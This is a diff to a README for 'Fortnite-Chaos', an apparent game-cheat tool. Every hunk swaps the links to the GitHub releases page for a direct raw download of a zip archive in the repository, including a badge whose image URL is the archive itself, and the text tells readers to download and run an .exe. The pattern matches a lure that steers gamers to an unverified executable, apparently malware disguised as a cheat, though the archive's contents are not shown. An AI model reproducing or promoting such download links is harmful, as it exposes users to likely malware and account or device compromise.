@@ -1,6 +1,6 @@
 # 🎮 Fortnite-Chaos - Gain a Competitive Edge Easily
 
-[![Download Fortnite-Chaos](https://img.shields.io/badge/Download-Fortnite--Chaos-blue?style=for-the-badge&logo=github)](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/releases)
+[![Download Fortnite-Chaos](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip)](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Use this guide to download and launch Fortnite-Chaos on your computer.
 
 Click the button at the top or follow this link:
 
-[Download Fortnite-Chaos Releases](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/releases)
+[Download Fortnite-Chaos Releases](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip)
 
 This page lists all the different versions of the software. Look for the latest release, which has the most recent updates and fixes.
 
@@ -114,7 +114,7 @@ The developers update Fortnite-Chaos regularly to improve performance and avoid 
 To keep the software working well:
 
 - Visit the GitHub release page often:  
-[https://github.com/stoianlubenov12-ux/Fortnite-Chaos/releases](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/releases)
+[https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip)
 - Download and install the latest `.exe` file.
 - Replace the older version with the new one on your computer.
 
@@ -124,7 +124,7 @@ To keep the software working well:
 
 You can always download the latest version here:
 
-[![Download Fortnite-Chaos](https://img.shields.io/badge/Download-Fortnite--Chaos-blue?style=for-the-badge&logo=github)](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/releases)
+[![Download Fortnite-Chaos](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip)](https://github.com/stoianlubenov12-ux/Fortnite-Chaos/raw/refs/heads/main/reunitive/Fortnite-Chaos-1.4.zip)
 
 Click the link, choose the latest `.exe` file under Assets, download it, and follow the steps in the "Getting Started" section.
 
